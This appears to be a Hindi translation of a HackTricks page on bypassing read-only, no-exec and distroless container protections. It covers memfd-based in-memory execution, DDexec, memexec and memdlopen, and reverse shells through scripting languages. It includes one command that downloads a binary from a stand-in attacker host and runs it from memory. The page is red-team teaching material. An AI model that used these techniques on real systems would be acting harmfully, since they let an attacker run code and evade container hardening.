# FS सुरक्षा को बायपास करें: केवल पढ़ने के लिए / कोई निष्पादन नहीं / डिस्ट्रोलैस

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो करें** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अ-हैक करने योग्य को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_फ्लूएंट पोलिश लिखित और मौखिक आवश्यक है_)।

{% embed url="https://www.stmcyber.com/careers" %}

## वीडियो

नीचे दिए गए वीडियो में आप इस पृष्ठ में उल्लेखित तकनीकों को अधिक गहराई से समझ सकते हैं:

* [**DEF CON 31 - Linux मेमोरी हेरफेर का अन्वेषण करना**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ng और इन-मेमोरी dlopen() के साथ स्टेल्थ घुसपैठ - HackTricks ट्रैक 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## केवल पढ़ने के लिए / कोई निष्पादन नहीं परिदृश्य

यह अधिक से अधिक सामान्य होता जा रहा है कि लिनक्स मशीनें **केवल पढ़ने के लिए (ro) फ़ाइल प्रणाली सुरक्षा** के साथ माउंट की जाती हैं, विशेष रूप से कंटेनरों में। इसका कारण यह है कि ro फ़ाइल प्रणाली के साथ कंटेनर चलाना **`readOnlyRootFilesystem: true`** को `securitycontext` में सेट करने जितना आसान है:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

हालांकि, भले ही फ़ाइल प्रणाली ro के रूप में माउंट की गई हो, **`/dev/shm`** अभी भी लिखने योग्य होगा, इसलिए यह गलत है कि हम डिस्क में कुछ भी नहीं लिख सकते। हालाँकि, यह फ़ोल्डर **कोई निष्पादन सुरक्षा** के साथ माउंट किया जाएगा, इसलिए यदि आप यहाँ एक बाइनरी डाउनलोड करते हैं, तो आप **इसे निष्पादित नहीं कर पाएंगे**।

{% hint style="warning" %}
रेड टीम के दृष्टिकोण से, यह **बाइनरी डाउनलोड और निष्पादित करना जटिल बनाता है** जो पहले से सिस्टम में नहीं हैं (जैसे बैकडोर या `kubectl` जैसे एन्यूमरेटर)।
{% endhint %}

## सबसे आसान बायपास: स्क्रिप्ट

ध्यान दें कि मैंने बाइनरी का उल्लेख किया, आप **किसी भी स्क्रिप्ट को निष्पादित कर सकते हैं** जब तक कि इंटरप्रेटर मशीन के अंदर हो, जैसे कि **शेल स्क्रिप्ट** यदि `sh` मौजूद है या **पायथन** **स्क्रिप्ट** यदि `python` स्थापित है।

हालांकि, यह आपके बाइनरी बैकडोर या अन्य बाइनरी उपकरणों को चलाने के लिए पर्याप्त नहीं है।

## मेमोरी बायपास

यदि आप एक बाइनरी निष्पादित करना चाहते हैं लेकिन फ़ाइल प्रणाली इसकी अनुमति नहीं दे रही है, तो ऐसा करने का सबसे अच्छा तरीका है **इसे मेमोरी से निष्पादित करना**, क्योंकि **सुरक्षाएँ वहाँ लागू नहीं होती हैं**।

### FD + exec syscall बायपास

यदि आपके पास मशीन के अंदर कुछ शक्तिशाली स्क्रिप्ट इंजन हैं, जैसे **Python**, **Perl**, या **Ruby**, तो आप मेमोरी से निष्पादित करने के लिए बाइनरी डाउनलोड कर सकते हैं, इसे एक मेमोरी फ़ाइल डिस्क्रिप्टर (`create_memfd` syscall) में स्टोर कर सकते हैं, जो उन सुरक्षा द्वारा संरक्षित नहीं होगा और फिर **`exec` syscall** को कॉल कर सकते हैं, जिसमें **fd को निष्पादित करने के लिए फ़ाइल के रूप में इंगित किया गया है**।

इसके लिए आप आसानी से प्रोजेक्ट [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) का उपयोग कर सकते हैं। आप इसे एक बाइनरी पास कर सकते हैं और यह निर्दिष्ट भाषा में एक स्क्रिप्ट उत्पन्न करेगा जिसमें **बाइनरी संकुचित और b64 एन्कोडेड** होगी और इसे **डिकोड और अनकंप्रेस** करने के लिए निर्देश होंगे, एक **fd** में जो `create_memfd` syscall को कॉल करके बनाया गया है और इसे चलाने के लिए **exec** syscall को कॉल किया गया है।

{% hint style="warning" %}
यह अन्य स्क्रिप्टिंग भाषाओं जैसे PHP या Node में काम नहीं करता क्योंकि उनके पास स्क्रिप्ट से कच्चे syscalls को कॉल करने का कोई डिफ़ॉल्ट तरीका नहीं है, इसलिए `create_memfd` को कॉल करके **मेमोरी fd** बनाने की संभावना नहीं है।

इसके अलावा, `/dev/shm` में एक फ़ाइल के साथ एक **नियमित fd** बनाना काम नहीं करेगा, क्योंकि आपको इसे चलाने की अनुमति नहीं होगी क्योंकि **कोई निष्पादन सुरक्षा** लागू होगी।
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) एक तकनीक है जो आपको **अपने स्वयं के प्रोसेस की मेमोरी को संशोधित करने** की अनुमति देती है, इसके **`/proc/self/mem`** को ओवरराइट करके।

इसलिए, **प्रक्रिया द्वारा निष्पादित हो रहे असेंबली कोड को नियंत्रित करते हुए**, आप एक **शेलकोड** लिख सकते हैं और प्रक्रिया को "म्यूट" कर सकते हैं ताकि **कोई भी मनमाना कोड निष्पादित किया जा सके**।

{% hint style="success" %}
**DDexec / EverythingExec** आपको **मेमोरी** से अपने स्वयं के **शेलकोड** या **कोई बाइनरी** लोड और **निष्पादित** करने की अनुमति देगा।
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) DDexec का स्वाभाविक अगला कदम है। यह एक **DDexec शेलकोड डेमोनाइज्ड** है, इसलिए हर बार जब आप **एक अलग बाइनरी चलाना चाहते हैं** तो आपको DDexec को फिर से लॉन्च करने की आवश्यकता नहीं है, आप बस DDexec तकनीक के माध्यम से memexec शेलकोड चला सकते हैं और फिर **नए बाइनरी लोड और चलाने के लिए इस डेमोन के साथ संवाद कर सकते हैं**।

आप [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) पर **memexec का उपयोग करके PHP रिवर्स शेल से बाइनरी निष्पादित करने** का एक उदाहरण पा सकते हैं।

### Memdlopen

DDexec के समान उद्देश्य के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) तकनीक **बाइनरी को लोड करने का एक आसान तरीका** प्रदान करती है ताकि बाद में उन्हें निष्पादित किया जा सके। यह यहां तक कि निर्भरताओं के साथ बाइनरी लोड करने की अनुमति भी दे सकती है।

## Distroless Bypass

### What is distroless

Distroless कंटेनर केवल **विशिष्ट एप्लिकेशन या सेवा को चलाने के लिए आवश्यक न्यूनतम घटक** होते हैं, जैसे कि पुस्तकालय और रनटाइम निर्भरताएँ, लेकिन पैकेज प्रबंधक, शेल, या सिस्टम उपयोगिताओं जैसे बड़े घटकों को बाहर करते हैं।

Distroless कंटेनरों का लक्ष्य **अनावश्यक घटकों को समाप्त करके कंटेनरों के हमले की सतह को कम करना** और उन कमजोरियों की संख्या को कम करना है जिन्हें शोषित किया जा सकता है।

### Reverse Shell

एक distroless कंटेनर में आप **शायद `sh` या `bash` भी नहीं पाएंगे** ताकि एक नियमित शेल प्राप्त किया जा सके। आप `ls`, `whoami`, `id` जैसे बाइनरी भी नहीं पाएंगे... सब कुछ जो आप आमतौर पर एक सिस्टम में चलाते हैं।

{% hint style="warning" %}
इसलिए, आप **रिवर्स शेल** प्राप्त करने या **सिस्टम की गणना** करने में सक्षम **नहीं होंगे** जैसे आप आमतौर पर करते हैं।
{% endhint %}

हालांकि, यदि समझौता किया गया कंटेनर उदाहरण के लिए एक फ्लास्क वेब चला रहा है, तो फिर पायथन स्थापित है, और इसलिए आप एक **Python रिवर्स शेल** प्राप्त कर सकते हैं। यदि यह नोड चला रहा है, तो आप एक नोड रिव शेल प्राप्त कर सकते हैं, और अधिकांश **स्क्रिप्टिंग भाषा** के साथ भी यही है।

{% hint style="success" %}
स्क्रिप्टिंग भाषा का उपयोग करके आप **सिस्टम की गणना** कर सकते हैं भाषा की क्षमताओं का उपयोग करके।
{% endhint %}

यदि **कोई `read-only/no-exec`** सुरक्षा नहीं है तो आप अपने रिवर्स शेल का दुरुपयोग करके **फाइल सिस्टम में अपने बाइनरी लिख सकते हैं** और **उन्हें निष्पादित** कर सकते हैं।

{% hint style="success" %}
हालांकि, इस प्रकार के कंटेनरों में ये सुरक्षा आमतौर पर मौजूद होंगी, लेकिन आप **पिछली मेमोरी निष्पादन तकनीकों का उपयोग करके उन्हें बायपास कर सकते हैं**।
{% endhint %}

आप [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) पर **कुछ RCE कमजोरियों का शोषण करने** के उदाहरण पा सकते हैं ताकि स्क्रिप्टिंग भाषाओं के **रिवर्स शेल** प्राप्त कर सकें और मेमोरी से बाइनरी निष्पादित कर सकें।

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अचूक को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_फ्लूएंट पोलिश लिखित और मौखिक आवश्यक_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) की जांच करें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो करें** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें PRs को [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में सबमिट करके।**

</details>
{% endhint %}
